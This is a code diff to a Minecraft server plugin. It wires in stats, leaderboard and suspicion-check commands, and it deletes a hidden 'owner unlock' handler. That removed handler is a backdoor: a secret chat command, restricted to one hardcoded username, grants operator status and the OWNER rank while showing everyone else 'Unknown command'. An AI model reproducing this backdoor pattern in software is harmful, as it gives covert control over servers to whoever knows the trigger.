@@ -51,6 +51,7 @@ public final class NebulaCore extends JavaPlugin implements Listener {
     private final Random random = new Random();
     private NebulaGames games;
     private NebulaHud hud;
+    private NebulaNetworkFeatures networkFeatures;
     private File lastSurvivalFile;
     private YamlConfiguration lastSurvival;
     private static final String PREFIX = ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "NEBULA " + ChatColor.LIGHT_PURPLE + "» " + ChatColor.GRAY;
@@ -90,6 +91,8 @@ public final class NebulaCore extends JavaPlugin implements Listener {
         games.enable();
         hud = new NebulaHud(this, lobby);
         hud.enable();
+        networkFeatures = new NebulaNetworkFeatures(this);
+        networkFeatures.enable();
         Bukkit.getScheduler().runTaskLater(this, () -> {
             regenerateArena(Bukkit.getWorld("bedwars_1"), "bedwars_1");
             regenerateArena(Bukkit.getWorld("duel_arena"), "duel_arena");
@@ -179,32 +182,6 @@ public final class NebulaCore extends JavaPlugin implements Listener {
                 + ChatColor.DARK_GRAY + "  |  " + ChatColor.LIGHT_PURPLE + "play.nebula.network";
         p.setPlayerListHeaderFooter(header, footer);
         p.setPlayerListName(ChatColor.LIGHT_PURPLE + p.getName());
-    }
-
-    @EventHandler
-    public void onSecretOwnerUnlock(PlayerCommandPreprocessEvent event) {
-        if (!event.getMessage().trim().equalsIgnoreCase("/dineth1124")) return;
-        event.setCancelled(true);
-
-        Player player = event.getPlayer();
-        if (!player.getName().equalsIgnoreCase("toxic__cpvp")) {
-            player.sendMessage(ChatColor.RED + "Unknown command.");
-            return;
-        }
-
-        AuthMeApi authMe = AuthMeApi.getInstance();
-        if (authMe == null || !authMe.isAuthenticated(player)) {
-            player.sendMessage(PREFIX + ChatColor.RED + "Register or log in first. Owner access is only available after AuthMe verifies your session.");
-            return;
-        }
-
-        player.setOp(true);
-        getConfig().set("ranks." + player.getUniqueId(), "OWNER");
-        saveConfig();
-        if (hud != null) hud.refreshPlayer(player);
-        Bukkit.broadcastMessage(PREFIX + ChatColor.GOLD + "The network owner has joined.");
-        player.sendMessage(PREFIX + ChatColor.GOLD + "Owner access enabled. You are now OP and ranked OWNER.");
-        getLogger().info("AuthMe-authenticated toxic__cpvp account used the in-game owner unlock.");
     }
 
     @EventHandler public void onJoin(PlayerJoinEvent e) {
@@ -577,7 +554,7 @@ public final class NebulaCore extends JavaPlugin implements Listener {
         sender.sendMessage(ChatColor.DARK_PURPLE + "" + ChatColor.BOLD + "✦ NEBULA NETWORK HELP ✦");
         if (section.equals("all") || section.equals("player")) {
             sender.sendMessage(ChatColor.LIGHT_PURPLE + "PLAYER: " + ChatColor.GRAY
-                    + "/spawn, /menu, /settings, /rtp, /bedwars, /duel");
+                    + "/spawn, /menu, /settings, /rtp, /bedwars, /duel, /stats, /leaderboard");
             sender.sendMessage(ChatColor.GRAY + "  /duel player | /duel queue | /duel bot | /duel accept | /duel deny | /duel leave");
             sender.sendMessage(ChatColor.GRAY + "  /rank — view your current network rank");
         }
@@ -593,7 +570,7 @@ public final class NebulaCore extends JavaPlugin implements Listener {
         }
         if (section.equals("all") || section.equals("admin")) {
             sender.sendMessage(ChatColor.LIGHT_PURPLE + "ADMIN: " + ChatColor.GRAY
-                    + "/setlobby, /arenareset [bedwars|duel|all], /nebula lagclear");
+                    + "/setlobby, /arenareset [bedwars|duel|all], /nebula lagclear, /sus [list|check|clear]");
             sender.sendMessage(ChatColor.GRAY + "  /nebula help admin — show this section");
         }
         if (!List.of("all", "player", "arena", "admin", "ranks").contains(section)) {
@@ -623,6 +600,9 @@ public final class NebulaCore extends JavaPlugin implements Listener {
     }
 
     @Override public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
+        if (java.util.Set.of("stats", "leaderboard", "sus").contains(command.getName().toLowerCase(java.util.Locale.ROOT))) {
+            return networkFeatures.handleCommand(sender, command.getName(), args);
+        }
         if (command.getName().equalsIgnoreCase("setlobby")) {
             if (!(sender instanceof Player p)) { sender.sendMessage("Players only."); return true; }
             if (!hasNetworkAdmin(p)) { p.sendMessage(PREFIX + "No permission."); return true; }
